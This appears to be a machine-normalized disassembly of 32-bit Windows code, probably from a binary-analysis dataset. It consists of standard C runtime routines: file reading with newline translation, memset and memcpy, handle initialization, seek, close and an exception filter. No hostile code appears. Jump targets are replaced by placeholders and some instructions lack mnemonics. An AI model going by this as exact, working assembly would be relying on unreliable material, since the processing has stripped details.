mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
add ebx 0x2
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
add ebx 0x2
add eax 0x2
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0x10 ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
add ecx 0x2
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0xc ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_405d3f
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_40c967
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40c967
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
add ebx 0x2
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_40c967
add esp 0x10
inc ebx
mov [ ecx + esi + 0x5 ] dl
cmp eax 0x2
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_40ad7b
push 0x10
push r--data
call sub_409f90
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405d52
and [ eax ] 0x0
call sub_405d3f
mov [ eax ] 0x9
call sub_405d52
and [ eax ] 0x0
call sub_405d3f
mov [ eax ] 0x9
cmp ebx [ rw-data ]
jb r-xdata
call sub_409fd5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push ebx
call sub_40dd3b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405d52
and [ eax ] 0x0
call sub_405d3f
mov [ eax ] 0x16
jmp r-xdata
call sub_405d3f
mov [ eax ] 0x9
call sub_405d52
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_40a7c4
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_4071e0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ae69
mov eax [ ebp - 0x1c ]
sub_40ae71
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_405d3f
push 0x16
pop esi
mov [ eax ] esi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_40aef0
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_40af70
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_405d3f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_4071e0
mov eax esi
jmp r-xdata
sub_40aef0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_40ed17
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_40af70
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40aff4 ]
jmp [ ecx * 4 + jump_table_40b074 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b0e0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_40b27c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40b180 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b27c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40b0e0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40b27c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b0e0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b0e0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40b0e0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b27c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b27c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40b27c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_40b2d1
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_40c0ac
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_40c0ac
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_40b516
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_40dcd2
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_405d3f
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_405d65
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_40b58b
push 0x10
push r--data
call sub_409f90
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405d52
and [ eax ] 0x0
call sub_405d3f
mov [ eax ] 0x9
call sub_405d52
and [ eax ] 0x0
call sub_405d3f
mov [ eax ] 0x9
call sub_4071e0
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_409fd5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40dd3b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405d3f
mov [ eax ] 0x9
call sub_405d52
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_40b516
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b657
mov eax [ ebp - 0x1c ]
sub_40b65f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40dcd2
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_405d65
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_40dcd2
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_40dcd2
push 0x1
mov edi eax
call sub_40dcd2
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_40dc4c
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_40b6fb
push 0x10
push r--data
call sub_409f90
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_405d52
and [ eax ] 0x0
call sub_405d3f
mov [ eax ] 0x9
call sub_405d52
and [ eax ] 0x0
call sub_405d3f
mov [ eax ] 0x9
call sub_4071e0
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_409fd5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40dd3b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405d3f
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_40b65f
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b7b7
mov eax [ ebp - 0x1c ]
sub_40b7bf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_404538
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_40b7f0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_40b858
push 0xc
push r--data
call sub_409f90
push 0xe
call sub_409da0
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b8bf
call sub_409fd5
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_404538
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_404538
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_40b8d0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_40b958
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_40c1cb
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_40b9a8
mov edi edi
push ebp
mov ebp esp
push esi
call sub_407d44
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
